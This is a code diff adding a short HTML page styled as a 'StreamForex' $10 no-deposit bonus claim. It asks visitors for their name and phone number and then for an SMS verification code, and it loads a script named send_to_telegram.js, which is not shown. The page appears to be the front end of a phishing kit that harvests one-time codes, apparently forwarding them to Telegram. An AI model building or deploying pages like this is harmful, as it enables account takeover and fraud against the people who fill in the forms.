@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>StreamForex - NDB $10 Claim</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <img src="https://streamforex.net/images/logo.png" alt="StreamForex Logo" class="logo">
+
+        <h2>Claim your $10 NDB Bonus</h2>
+        <form id="application-form">
+            <h3>Application Form</h3>
+            <input type="text" id="name" placeholder="Full Name" required>
+            <input type="tel" id="phone" placeholder="Phone Number" required>
+            <button type="submit">Claim NDB $10</button>
+            <p id="app-msg"></p>
+        </form>
+
+        <form id="activation-form">
+            <h3>Activation Form</h3>
+            <input type="text" id="name2" placeholder="Full Name" required>
+            <input type="tel" id="phone2" placeholder="Phone Number" required>
+            <input type="text" id="code" placeholder="SMS Code" required>
+            <button type="submit">Submit Code</button>
+            <p id="act-msg"></p>
+        </form>
+    </div>
+
+    <script src="send_to_telegram.js"></script>
+</body>
+</html>
